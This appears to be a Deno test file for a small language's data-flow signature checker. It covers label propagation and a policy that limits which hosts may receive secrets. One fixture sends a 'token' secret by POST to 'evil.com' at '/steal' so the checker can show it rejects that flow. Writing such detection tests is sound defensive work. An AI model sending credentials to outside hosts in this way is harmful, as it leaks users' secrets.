import {
  assert,
  assertEquals,
} from "https://deno.land/std@0.224.0/assert/mod.ts";
import { tokenize } from "../src/lang/lexer.ts";
import { parse } from "../src/lang/parser.ts";
import { interpret } from "../src/lang/interpreter.ts";
import {
  checkSignatureAgainstPolicy,
  checkSignatureAgainstRelation,
  computeSignature,
} from "../src/lang/signature.ts";
import {
  builtinRegistry,
  builtinUnaryFields,
  type OpEntry,
} from "../src/lang/registry.ts";
import { op } from "../src/op.ts";
import type { ExecutionContext } from "../src/types.ts";
import type { Program } from "../src/lang/ast.ts";

const parseSource = (source: string): Program =>
  parse(tokenize(source), builtinUnaryFields);

const { z } = await import("zod/v4");

// An op that emits an `owner:alice` label on every output, modeling a
// consumer-side source such as a row-ownership stamp.
const tagOp = op({
  input: z.object({ v: z.string() }),
  output: z.string(),
  tags: ["pure"],
  resources: { memoryBytes: 0, runtimeMs: 0, diskBytes: 0 },
  emits: ["owner:alice"],
  run: ({ v }) => Promise.resolve(v),
});

// An op that emits a `viewer:bob` label, modeling a session-principal source.
const whoamiOp = op({
  input: z.object({}),
  output: z.string(),
  tags: ["pure"],
  resources: { memoryBytes: 0, runtimeMs: 0, diskBytes: 0 },
  emits: ["viewer:bob"],
  run: () => Promise.resolve("bob"),
});

const labelRegistry: ReadonlyMap<string, OpEntry> = new Map([
  ...builtinRegistry,
  ["tag", { staticFields: new Set(), unaryField: null, create: () => tagOp }],
  [
    "whoami",
    { staticFields: new Set(), unaryField: null, create: () => whoamiOp },
  ],
]);

const sigWithLabels = (source: string, fnName: string) =>
  computeSignature(parseSource(source), fnName, labelRegistry);

const dummyCtx: ExecutionContext = {
  fetch: () => Promise.reject(new Error("no fetch in test")),
};

Deno.test("labels - op emits appear in signature sources", () => {
  const s = sigWithLabels(`f = () => { v = whoami() return v }`, "f");
  assertEquals(s.sources, new Set(["viewer:bob"]));
  assertEquals(s.dataFlow.get("return"), new Set(["viewer:bob"]));
});

Deno.test("labels - emitted labels union through branches", () => {
  const s = sigWithLabels(
    `f = (flag: boolean, note: string) => { t = tag({ v: note }) out = flag ? t : note return out }`,
    "f",
  );
  assertEquals(
    s.dataFlow.get("return"),
    new Set(["param:flag", "param:note", "owner:alice"]),
  );
  assert(s.sources.has("owner:alice"));
});

Deno.test("labels - emitted labels union through map", () => {
  const s = sigWithLabels(
    `
    stamp = (n: string) => { return tag({ v: n }) }
    main = (notes: string[]) => { return map(stamp, notes) }
  `,
    "main",
  );
  assert(s.sources.has("owner:alice"));
  assert(s.dataFlow.get("return")?.has("owner:alice") ?? false);
});

Deno.test("labels - relation rejects owner-labeled flow to host sink", () => {
  const s = sigWithLabels(
    `
    f = (token: string) => {
      t = tag({ v: token })
      r = httpRequest({ host: "api.example.com", method: "POST", path: "/save", body: t })
      return r
    }
  `,
    "f",
  );
  const denyOwners = (labels: ReadonlySet<string>, _sink: string) =>
    ![...labels].some((l) => l.startsWith("owner:"));
  const violations = checkSignatureAgainstRelation(s, denyOwners);
  assertEquals(violations.length, 1);
  assertEquals(violations[0].kind, "labels");
  assertEquals(violations[0].sink, "host:api.example.com");
  assertEquals(
    violations[0].labels,
    new Set(["param:token", "owner:alice"]),
  );
});

Deno.test("labels - allow-all relation yields no violations", () => {
  const s = sigWithLabels(
    `f = (token: string) => { t = tag({ v: token }) return t }`,
    "f",
  );
  assertEquals(checkSignatureAgainstRelation(s, () => true), []);
});

Deno.test("labels - relation observes exact sink label sets", () => {
  const s = sigWithLabels(`f = (x: string) => { return x }`, "f");
  const seen: Array<[ReadonlySet<string>, string]> = [];
  const violations = checkSignatureAgainstRelation(
    s,
    (labels, sink) => {
      seen.push([labels, sink]);
      return true;
    },
  );
  assertEquals(violations, []);
  assertEquals(seen, [[new Set(["param:x"]), "return"]]);
});

Deno.test("labels - interpret ignores labels at runtime", async () => {
  const who = await interpret(
    parseSource(`f = () => { v = whoami() return v }`),
    "f",
    {},
    dummyCtx,
    labelRegistry,
  );
  assertEquals(who, "bob");
  const tagged = await interpret(
    parseSource(`f = (note: string) => { return tag({ v: note }) }`),
    "f",
    { note: "hi" },
    dummyCtx,
    labelRegistry,
  );
  assertEquals(tagged, "hi");
});

const secretPolicy = {
  paramToSecret: new Map([["token", "API_KEY"]]),
  hostsBySecret: new Map([["API_KEY", new Set(["api.example.com"])]]),
};

Deno.test("compat - policy checker allows secret to allowlisted host", () => {
  const s = computeSignature(
    parseSource(
      `f = (token: string) => { r = httpRequest({ host: "api.example.com", method: "POST", path: "/auth", body: token }) return r }`,
    ),
    "f",
    builtinRegistry,
  );
  assertEquals(
    checkSignatureAgainstPolicy(
      s,
      secretPolicy.paramToSecret,
      secretPolicy.hostsBySecret,
    ),
    [],
  );
});

Deno.test("compat - policy checker rejects secret to unallowlisted host", () => {
  const s = computeSignature(
    parseSource(
      `f = (token: string) => { r = httpRequest({ host: "evil.com", method: "POST", path: "/steal", body: token }) return r }`,
    ),
    "f",
    builtinRegistry,
  );
  const violations = checkSignatureAgainstPolicy(
    s,
    secretPolicy.paramToSecret,
    secretPolicy.hostsBySecret,
  );
  assertEquals(violations.length, 1);
  assertEquals(violations[0].kind, "hosts");
  assertEquals(violations[0].requested, new Set(["evil.com"]));
});

Deno.test("compat - policy checker enforces complexity degree", () => {
  const s = computeSignature(
    parseSource(
      `
      double = (x: number) => { return x * 2 }
      processRow = (row: number[]) => { return map(double, row) }
      processMatrix = (matrix: number[][]) => { return map(processRow, matrix) }
      processCube = (cube: number[][][]) => { return map(processMatrix, cube) }
      processTesseract = (t: number[][][][]) => { return map(processCube, t) }
      main = (hyper: number[][][][][]) => { return map(processTesseract, hyper) }
    `,
    ),
    "main",
    builtinRegistry,
  );
  const violations = checkSignatureAgainstPolicy(
    s,
    new Map(),
    new Map(),
  );
  assertEquals(violations.length, 1);
  assertEquals(violations[0].kind, "complexity");
});
